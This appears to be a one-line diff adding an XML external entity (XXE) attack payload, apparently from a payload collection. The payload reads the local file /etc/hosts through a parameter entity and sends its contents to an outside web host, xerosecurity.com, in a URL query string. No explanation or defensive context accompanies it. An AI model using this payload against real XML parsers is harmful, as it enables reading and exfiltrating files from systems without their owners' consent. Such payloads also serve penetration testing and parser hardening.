@@ -1,0 +1,1 @@
+<!ENTITY % data SYSTEM "file:///etc/hosts"><!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://xerosecurity.com/.testing/xxe_vuln.html?%data;'>">
